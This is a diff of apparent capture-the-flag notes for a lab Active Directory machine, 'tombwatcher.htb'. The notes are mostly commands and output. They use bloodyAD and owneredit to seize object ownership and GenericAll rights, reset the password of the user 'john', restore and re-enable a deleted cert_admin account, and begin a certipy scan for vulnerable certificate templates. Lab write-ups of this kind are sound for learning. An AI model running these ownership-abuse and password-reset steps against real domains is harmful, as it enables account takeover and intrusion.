@@ -81,10 +81,30 @@ SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\sam:bask
 
 python3 targetedKerberoast.py -d tombwatcher.htb -u sam -p basketball --dc-ip 10.10.11.72
 
-Abuse WriteOwner following this documentation (https://www.thehacker.recipes/ad/movement/dacl/grant-ownership#grant-ownership)
+Abuse WriteOwner following this documentation (1 - https://www.thehacker.recipes/ad/movement/dacl/grant-ownership#grant-ownership, 2 - https://www.thehacker.recipes/ad/movement/dacl/grant-rights)
+![[Screenshot_20250906_195745.jpg]]
+```bash
+/opt/bloodyAD  main ?1  python3 bloodyAD.py --host 10.10.11.72 -d "tombwatcher.htb" -u sam -p basketball set owner "john" "sam"
+[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
+
+ /opt/bloodyAD  main ?1  python3 bloodyAD.py --host 10.10.11.72 -d "tombwatcher.htb" -u sam -p basketball add genericAll "john" "sam"
+[+] sam has now GenericAll on john
+
+ /Shared/temp  net rpc password john 'basketball' -U tombwatcher.htb/sam%basketball -S 10.10.11.72                                  255 ✘ 
+ 
+ /Shared/temp  crackmapexec smb 10.10.11.72 -u john -p basketball                                                                       ✔ 
+SMB         10.10.11.72     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\john:basketball 
+```
+
+Now we can access winRM as john
+
+#### Privesc: (Incomplete)
+
+![[Screenshot_20250907_105906.jpg]]
 
 ```bash
-/opt/targetedKerberoast  main ?2  owneredit.py -action write -new-owner 'sam' -target 'john' tombwatcher.htb/sam:basketball -dc-ip 10.10.11.72   
+ /opt/bloodyAD  main ?1  owneredit.py -action write -new-owner 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'basketball'
 
   import pkg_resources
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -96,6 +116,11 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] OwnerSid modified successfully!
 ```
 
-After this, we update Bloodhound and appears like this:
+![[Screenshot_20250907_112102.jpg]]
 
-![[Screenshot_20250906_195745.jpg]]
+
+Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
+Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+Enable-ADAccount -Identity cert_admin
+Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "basketball" -AsPlainText -Force)
+certipy find -u cert_admin -p basketball -dc-ip 10.10.11.72 -vulnerable -enabled
